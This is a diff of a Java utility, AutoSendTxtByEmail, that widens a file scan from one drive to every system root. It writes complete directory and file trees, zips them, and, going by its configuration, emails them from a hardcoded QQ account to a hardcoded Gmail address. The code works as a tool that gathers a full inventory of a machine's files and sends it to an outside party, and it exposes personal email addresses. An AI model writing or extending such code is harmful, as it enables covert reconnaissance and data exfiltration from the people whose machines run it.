@@ -14,14 +14,15 @@ import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
+import java.util.Arrays;
 import java.util.Properties;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 public class AutoSendTxtByEmail {
     // -------------------------- 基本配置（按需修改） --------------------------
-    private static String ROOT_TO_SCAN = "E:\\";                         // 要遍历的根目录
-    private static Path   WORK_BASE    = Paths.get("E:\\Scan-Exports");  // 结果输出的根目录
+    private static File[] ROOTS_TO_SCAN = detectSystemRoots();             // 要遍历的所有根目录
+    private static Path   WORK_BASE      = Paths.get("E:\\Scan-Exports");  // 结果输出的根目录
 
     private static final String SENDER_EMAIL   = "1968065099@qq.com";    // 发件人（QQ 邮箱）
     private static final String RECEIVER_EMAIL = "dashuaige0079@gmail.com"; // 收件人
@@ -31,8 +32,17 @@ public class AutoSendTxtByEmail {
     // -----------------------------------------------------------------------
 
     public static void main(String[] args) throws Exception {
-        // 支持命令行传参覆盖：ROOT、WORK_BASE、RECEIVER
-        if (args.length >= 1) ROOT_TO_SCAN = args[0];
+        // 支持命令行传参覆盖：ROOTS(分号分隔)、WORK_BASE、RECEIVER
+        if (args.length >= 1) {
+            ROOTS_TO_SCAN = Arrays.stream(args[0].split(";"))
+                    .map(String::trim)
+                    .filter(s -> !s.isEmpty())
+                    .map(File::new)
+                    .toArray(File[]::new);
+            if (ROOTS_TO_SCAN.length == 0) {
+                ROOTS_TO_SCAN = detectSystemRoots();
+            }
+        }
         if (args.length >= 2) WORK_BASE = Paths.get(args[1]);
         if (args.length >= 3) ; // 保留可扩展
 
@@ -45,8 +55,8 @@ public class AutoSendTxtByEmail {
         Path level1Txt = outDir.resolve("level-1-directories.txt");
         Path fullTreeTxt = outDir.resolve("full-tree.txt");
 
-        writeLevel1(ROOT_TO_SCAN, level1Txt);
-        writeFullTree(ROOT_TO_SCAN, fullTreeTxt);
+        writeLevel1(ROOTS_TO_SCAN, level1Txt);
+        writeFullTree(ROOTS_TO_SCAN, fullTreeTxt);
 
         // 3) 打包 ZIP（打包 outDir 本身）
         Path zipPath = Paths.get(outDir.toString() + ".zip");
@@ -69,26 +79,44 @@ public class AutoSendTxtByEmail {
     }
 
     /** 生成一级目录清单 */
-    private static void writeLevel1(String root, Path output) throws IOException {
-        File r = new File(root);
-        File[] children = r.listFiles(File::isDirectory);
+    private static void writeLevel1(File[] roots, Path output) throws IOException {
         Files.createDirectories(output.getParent());
 
         try (BufferedWriter w = Files.newBufferedWriter(output, StandardCharsets.UTF_8)) {
-            if (children == null) return;
-            java.util.Arrays.sort(children, (a, b) -> a.getName().compareToIgnoreCase(b.getName()));
-            for (File c : children) {
-                w.write(c.getAbsolutePath());
+            for (File root : roots) {
+                if (root == null || !root.exists()) {
+                    continue;
+                }
+                w.write("# " + root.getAbsolutePath());
+                w.newLine();
+
+                File[] children = root.listFiles(File::isDirectory);
+                if (children != null && children.length > 0) {
+                    Arrays.sort(children, (a, b) -> a.getName().compareToIgnoreCase(b.getName()));
+                    for (File c : children) {
+                        w.write(c.getAbsolutePath());
+                        w.newLine();
+                    }
+                }
+
                 w.newLine();
             }
         }
     }
 
     /** 递归写完整树（目录+文件） */
-    private static void writeFullTree(String root, Path output) throws IOException {
+    private static void writeFullTree(File[] roots, Path output) throws IOException {
         Files.createDirectories(output.getParent());
         try (BufferedWriter w = Files.newBufferedWriter(output, StandardCharsets.UTF_8)) {
-            walk(new File(root), w);
+            for (File root : roots) {
+                if (root == null || !root.exists()) {
+                    continue;
+                }
+                w.write("# ROOT: " + root.getAbsolutePath());
+                w.newLine();
+                walk(root, w);
+                w.newLine();
+            }
         }
     }
 
@@ -110,6 +138,14 @@ public class AutoSendTxtByEmail {
                 }
             }
         }
+    }
+
+    private static File[] detectSystemRoots() {
+        File[] roots = File.listRoots();
+        if (roots == null || roots.length == 0) {
+            return new File[] { new File("/") };
+        }
+        return roots;
     }
 
     /** 将目录打包为 zip */
